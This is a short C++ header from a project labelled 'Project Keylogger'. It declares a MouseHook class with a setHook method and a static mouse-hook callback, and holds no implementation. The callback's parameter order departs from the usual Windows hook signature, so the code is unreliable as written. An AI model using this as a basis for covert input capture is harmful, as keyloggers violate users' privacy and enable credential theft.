/**
 *							Project Keylogger
 */


#ifndef						_MOUSEHOOK_H
#define						_MOUSEHOOK_H

#include					"AHook.h"

class  MouseHook: public AHook {

public: 
    
MouseHook(const HookObserver&);
const bool					setHook() const;    
static LRESULT CALLBACK		mousehook(const int, const LPARAM, const WPARAM);
};

#endif //_MOUSEHOOK_H